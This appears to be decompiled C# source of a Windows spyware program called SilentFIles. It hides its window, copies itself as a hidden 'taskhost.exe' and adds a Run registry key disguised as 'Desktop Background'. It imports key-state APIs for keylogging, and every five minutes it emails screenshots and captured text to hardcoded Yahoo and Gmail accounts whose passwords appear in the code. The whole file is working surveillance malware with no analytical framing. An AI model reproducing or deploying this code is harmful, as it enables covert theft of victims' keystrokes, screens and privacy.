using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SilentFIles.My;

namespace SilentFIles;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TxtKeys")]
	private TextBox _TxtKeys;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	private SmtpClient SmtpServer;

	private MailMessage mail;

	private string AppName;

	private MemoryStream MemStream;

	internal virtual TextBox TxtKeys
	{
		[DebuggerNonUserCode]
		get
		{
			return _TxtKeys;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TxtKeys = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer1 = value;
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick_1;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		SmtpServer = new SmtpClient();
		mail = new MailMessage();
		AppName = "\\taskhost.exe";
		MemStream = new MemoryStream();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TxtKeys = new TextBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		((Control)this).SuspendLayout();
		((TextBoxBase)TxtKeys).set_BackColor(SystemColors.ButtonShadow);
		((TextBoxBase)TxtKeys).set_BorderStyle((BorderStyle)0);
		componentResourceManager.ApplyResources(TxtKeys, "TxtKeys");
		((Control)TxtKeys).set_Name("TxtKeys");
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1);
		Timer2.set_Enabled(true);
		Timer2.set_Interval(300000);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)0);
		componentResourceManager.ApplyResources(this, "$this");
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TxtKeys);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetKeyState(int nVirtKey);

	private void Form1_Load(object sender, EventArgs e)
	{
		Version version = Environment.OSVersion.Version;
		if (version.Major == 5)
		{
			CopyFile("C:\\Windows\\System32");
		}
		if (version.Major == 6)
		{
			CopyFile("C:\\ProgramData");
		}
		((Form)this).set_ShowInTaskbar(false);
	}

	private Bitmap TakeScreenShot()
	{
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
		Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Point point = new Point(0, 0);
		Point point2 = new Point(0, 0);
		val2.CopyFromScreen(point, point2, size);
		return val;
	}

	public void RunAtStartup(string ApplicationName, string ApplicationPath)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		RegistryKey registryKey2 = registryKey;
		registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey2.SetValue(ApplicationName, ApplicationPath);
		registryKey2 = null;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void CopyFile(string Path)
	{
		string path = Path + AppName;
		if (!File.Exists(path))
		{
			RunAtStartup("Desktop Background", Path + AppName);
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Path + AppName);
			File.SetAttributes(Path + AppName, FileAttributes.Hidden);
			Interaction.Shell(Path + AppName, (AppWinStyle)0, false, -1);
		}
		if (Operators.CompareString(Path + AppName, Application.get_ExecutablePath(), false) != 0)
		{
			ProjectData.EndApp();
		}
	}

	private bool getCapslock()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 54:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
				flag = (GetKeyState(20) & 1) != 0;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 54;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private bool getShift()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 52:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
				flag = GetAsyncKeyState(16) != 0;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 52;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void Timer2_Tick_1(object sender, EventArgs e)
	{
		((Image)TakeScreenShot()).Save((Stream)MemStream, ImageFormat.get_Jpeg());
		try
		{
			YahooServer();
			return;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			TxtKeys.set_Text(Environment.NewLine + ex2.Message + " [Yahoo Server]" + Environment.NewLine);
			ProjectData.ClearProjectError();
		}
		try
		{
			GmailServer();
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			TxtKeys.set_Text(Environment.NewLine + ex4.Message + " [Gmail Server]" + Environment.NewLine);
			ProjectData.ClearProjectError();
		}
	}

	private void YahooServer()
	{
		SmtpServer.Credentials = new NetworkCredential("servermail44@yahoo.com", "123AAA@@@");
		SmtpServer.Port = 587;
		SmtpServer.Host = "smtp.mail.yahoo.com";
		SmtpServer.EnableSsl = false;
		mail = new MailMessage();
		mail.From = new MailAddress("servermail44@yahoo.com");
		mail.To.Add("servermail44@yahoo.com");
		mail.Subject = Environment.MachineName;
		mail.Body = TxtKeys.get_Text();
		MemStream.Seek(0L, SeekOrigin.Begin);
		mail.Attachments.Add(new Attachment(MemStream, "Screenshot.jpg"));
		SmtpServer.Send(mail);
		MemStream.Flush();
		MemStream = new MemoryStream(MemStream.ToArray());
	}

	private void GmailServer()
	{
		SmtpServer.Credentials = new NetworkCredential("servermail44@gmail.com", "123AAA@@@");
		SmtpServer.Port = 587;
		SmtpServer.Host = "smtp.gmail.com";
		SmtpServer.EnableSsl = true;
		mail = new MailMessage();
		mail.From = new MailAddress("servermail44@gmail.com");
		mail.To.Add("servermail44@gmail.com");
		mail.Subject = Environment.MachineName;
		mail.Body = TxtKeys.get_Text();
		MemStream.Seek(0L, SeekOrigin.Begin);
		mail.Attachments.Add(new Attachment(MemStream, "Screenshot.jpg"));
		SmtpServer.Send(mail);
		MemStream.Flush();
		MemStream = new MemoryStream(MemStream.ToArray());
	}
}
